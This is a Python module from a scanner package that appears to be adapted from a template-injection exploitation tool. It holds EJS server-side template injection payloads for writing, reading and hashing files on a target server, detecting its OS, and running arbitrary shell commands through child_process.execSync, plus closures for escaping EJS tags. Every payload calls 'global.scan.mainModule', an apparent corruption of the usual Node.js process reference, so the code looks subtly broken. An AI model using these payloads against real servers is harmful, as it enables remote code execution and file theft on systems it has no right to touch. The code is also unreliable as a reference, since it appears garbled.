from myscan.lib.scriptlib.ssti.languages import javascript


class Ejs(javascript.Javascript):
    
    def init(self):

        self.update_actions({
            'render' : {
                'header': """<%%- '%(header)s'+""",
                'trailer': """+'%(trailer)s' %%>""",
            },
            'write' : {
                'write' : """<%%global.scan.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')%%>""",
                'truncate' : """<%%global.scan.mainModule.require('fs').writeFileSync('%(path)s', '')%%>"""
            },
            'read' : {
                'read' : """global.scan.mainModule.require('fs').readFileSync('%(path)s').toString('base64')"""
            },
            'md5' : {
                'md5': """global.scan.mainModule.require('crypto').createHash('md5').update(global.scan.mainModule.require('fs').readFileSync('%(path)s')).digest("hex")"""
            },
            'evaluate' : {
                'test_os': """global.scan.mainModule.require('os').platform()"""
            },
            'execute_blind' : {
                'execute_blind': """<%%global.scan.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')%%>"""
            },
            'execute' : {
                'execute': """global.scan.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
            },
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },
            
            {
                'level': 1,
                'prefix': '%(closure)s%%>', # Terminates EJS tag
                'suffix' : '<%%#', # EJS comment out
                'closures' : javascript.ctx_closures
            },

            {
                'level': 2,
                'prefix': '%(closure)s%%>', # Terminates EJS tag
                'suffix' : '<%%#', # EJS comment out
                'closures' : { 1: [ "'", ')' ], 2: [ '"', ')' ] }  # Close function with quote
            },

            {
                'level': 3,
                'prefix': '*/%%>',  # Terminates block comments
                'suffix' : '<%%#'   # EJS comment out
            },
            
        ])
